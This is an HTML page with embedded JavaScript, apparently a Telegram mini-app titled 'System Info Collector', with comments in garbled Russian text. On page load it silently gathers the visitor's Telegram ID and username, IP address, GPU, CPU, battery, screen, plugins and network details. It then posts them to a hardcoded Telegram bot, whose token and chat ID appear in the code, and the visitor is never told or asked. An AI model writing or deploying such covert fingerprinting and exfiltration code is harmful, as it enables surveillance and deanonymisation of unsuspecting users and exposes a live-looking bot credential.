<!DOCTYPE html>
<html>
<head>
    <title>System Info Collector</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<script>
    // ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼, Ñ‡Ñ‚Ğ¾ Telegram WebApp API Ğ´Ğ¾ÑÑ‚ÑƒĞ¿ĞµĞ½
    if (window.Telegram && Telegram.WebApp) {
        Telegram.WebApp.enableClosingConfirmation();
    }

    // Telegram Bot API configuration
    const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
    const CHAT_ID = '8017006818';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const tg = window.Telegram?.WebApp;
    const userId = tg?.initDataUnsafe?.user?.id;
    const username = tg?.initDataUnsafe?.user?.username || 'Ğ½Ğµ ÑƒĞºĞ°Ğ·Ğ°Ğ½';

    // Ğ’ÑĞ¿Ğ¾Ğ¼Ğ¾Ğ³Ğ°Ñ‚ĞµĞ»ÑŒĞ½Ğ°Ñ Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ñ Ğ´Ğ»Ñ Ğ¾Ñ‚Ğ¾Ğ±Ñ€Ğ°Ğ¶ĞµĞ½Ğ¸Ñ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğ¹ (ĞµÑĞ»Ğ¸ Ğ½ÑƒĞ¶Ğ½Ğ¾)
    function showMessage(message) {
        console.log(message);
    }

    // Detect browser features
    function detectFeatures() {
        const features = {
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            java: navigator.javaEnabled(),
            pdf: navigator.pdfViewerEnabled,
            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            webgl: !!window.WebGLRenderingContext,
            webaudio: !!window.AudioContext || !!window.webkitAudioContext,
            serviceWorker: 'serviceWorker' in navigator,
            notification: 'Notification' in window,
            battery: 'getBattery' in navigator,
            vibration: 'vibrate' in navigator,
            storage: {
                localStorage: 'localStorage' in window,
                sessionStorage: 'sessionStorage' in window,
                indexedDB: 'indexedDB' in window
            }
        };
        return features;
    }

    // Get GPU information
    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'WebGL Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµÑ‚ÑÑ';

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            } : 'Ğ”ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ğ°Ñ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ Ğ¾ GPU Ğ½ĞµĞ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ°';
        } catch (e) {
            return `ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»ĞµĞ½Ğ¸Ñ GPU: ${e.message}`;
        }
    }

    // Get CPU cores
    function getCPUCores() {
        return navigator.hardwareConcurrency || 'Ğ½ĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
    }

    // Get device memory
    function getDeviceMemory() {
        return navigator.deviceMemory || 'Ğ½ĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
    }

    // Get battery info
    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level * 100 + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                return 'ĞÑˆĞ¸Ğ±ĞºĞ° Battery API';
            }
        }
        return 'Battery API Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµÑ‚ÑÑ';
    }

    // Get network information
    function getNetworkInfo() {
        if (navigator.connection) {
            return {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                saveData: navigator.connection.saveData
            };
        }
        return 'Network Information API Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµÑ‚ÑÑ';
    }

    // Get IP info (Ğ±ĞµĞ· Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸)
    async function getIPInfo() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return { ip: data.ip };
        } catch (e) {
            return { ip: 'Ğ½ĞµĞ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ¾' };
        }
    }

    // Get browser plugins
    function getPlugins() {
        return Array.from(navigator.plugins).map(plugin => plugin.name);
    }

    // Main function to collect all data
    async function collectSystemInfo() {
        try {
            showMessage(`ID Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ Telegram: ${userId || 'Ğ½Ğµ Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»ĞµĞ½'}`);
            showMessage(`Ğ®Ğ·ĞµÑ€Ğ½ĞµĞ¹Ğ¼ Telegram: ${username}`);

            const batteryInfo = await getBatteryInfo();
            const ipInfo = await getIPInfo();

            const systemInfo = {
                // Basic info
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,

                // Telegram info
                telegram: {
                    userId: userId,
                    username: username
                },

                // Hardware
                cpuCores: getCPUCores(),
                deviceMemory: getDeviceMemory() + ' GB',
                gpu: getGPUInfo(),
                battery: batteryInfo,

                // Screen
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || 'unknown'
                },

                // Browser
                browser: {
                    name: navigator.appName,
                    version: navigator.appVersion,
                    product: navigator.product,
                    plugins: getPlugins(),
                    mimeTypes: Array.from(navigator.mimeTypes).map(mime => mime.type)
                },

                // Network
                network: getNetworkInfo(),
                ipInfo: ipInfo,

                // Features
                features: detectFeatures(),

                // Performance
                performance: {
                    memory: window.performance?.memory ? {
                        jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                        usedJSHeapSize: window.performance.memory.usedJSHeapSize
                    } : 'Memory API Ğ½Ğµ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ°',
                    timing: window.performance?.timing ? {
                        loadTime: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) + 'ms'
                    } : 'Timing API Ğ½Ğµ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ°'
                }
            };

            await sendToTelegram(systemInfo);
            console.log("Ğ”Ğ°Ğ½Ğ½Ñ‹Ğµ ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ñ‹");
        } catch (error) {
            console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ ÑĞ±Ğ¾Ñ€Ğµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…:", error);
        }
    }

    // Send data to Telegram
    async function sendToTelegram(data) {
        try {
            let text = `ğŸ–¥ *System Information Report* ğŸ–¥\n\n`;

            // Telegram user info
            text += `ğŸ‘¤ *Telegram User*\n`;
            text += `ğŸ†” *ID:* ${data.telegram.userId || 'Ğ½ĞµĞ¸Ğ·Ğ²ĞµÑÑ‚ĞµĞ½'}\n`;
            text += `ğŸ“› *Username:* ${data.telegram.username || 'Ğ½Ğµ ÑƒĞºĞ°Ğ·Ğ°Ğ½'}\n\n`;

            // Basic info
            text += `ğŸ“… *Timestamp:* ${data.timestamp}\n`;
            text += `ğŸŒ *User Agent:* ${data.userAgent}\n`;
            text += `ğŸ’» *Platform:* ${data.platform}\n`;
            text += `ğŸ· *Vendor:* ${data.vendor || 'unknown'}\n`;
            text += `ğŸ—£ *Language:* ${data.language}\n\n`;

            // Hardware
            text += `âš™ï¸ *Hardware Information*\n`;
            text += `ğŸ”¢ *CPU Cores:* ${data.cpuCores}\n`;
            text += `ğŸ§  *Device Memory:* ${data.deviceMemory}\n`;
            text += `ğŸ® *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
            text += `ğŸ–¥ *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
            text += `ğŸ”‹ *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;

            // Screen
            text += `ğŸ–¥ *Screen Information*\n`;
            text += `ğŸ“ *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
            text += `ğŸ–¼ *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
            text += `ğŸ¨ *Color Depth:* ${data.screen.colorDepth}-bit\n`;
            text += `ğŸ” *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
            text += `ğŸ”„ *Orientation:* ${data.screen.orientation}\n\n`;

            // Network
            text += `ğŸŒ *Network Information*\n`;
            if (typeof data.network === 'object') {
                text += `ğŸ“¶ *Connection Type:* ${data.network.type}\n`;
                text += `â¬‡ï¸ *Download Speed:* ${data.network.downlink}\n`;
                text += `â± *Round Trip Time:* ${data.network.rtt}\n`;
                text += `ğŸ’¾ *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
            } else {
                text += `${data.network}\n`;
            }

            // IP Info
            if (typeof data.ipInfo === 'object') {
                text += `ğŸ“ *IP Address:* ${data.ipInfo.ip}\n`;
            } else {
                text += `${data.ipInfo}\n\n`;
            }

            // Features
            text += `âœ¨ *Browser Features*\n`;
            text += `ğŸª *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
            text += `ğŸš« *Do Not Track:* ${data.features.doNotTrack}\n`;
            text += `â˜• *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
            text += `ğŸ“„ *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
            text += `ğŸ‘† *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
            text += `ğŸ–ï¸ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
            text += `ğŸ”Š *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;

            // Plugins
            text += `ğŸ§© *Browser Plugins*\n`;
            text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;

            // Performance
            text += `âš¡ *Performance Information*\n`;
            if (typeof data.performance.memory === 'object') {
                text += `ğŸ§  *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
            } else {
                text += `${data.performance.memory}\n`;
            }

            if (typeof data.performance.timing === 'object') {
                text += `â± *Page Load Time:* ${data.performance.timing.loadTime}\n`;
            } else {
                text += `${data.performance.timing}\n`;
            }

            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            if (!response.ok) {
                throw new Error(`ĞÑˆĞ¸Ğ±ĞºĞ° HTTP: ${response.status}`);
            }

            const responseData = await response.json();
            if (!responseData.ok) {
                throw new Error(`ĞÑˆĞ¸Ğ±ĞºĞ° Telegram API: ${responseData.description}`);
            }
        } catch (error) {
            console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ… Ğ² Telegram:", error);
            throw error;
        }
    }

    // Start collection on page load
    window.addEventListener('load', collectSystemInfo);
</script>
</body>
</html>
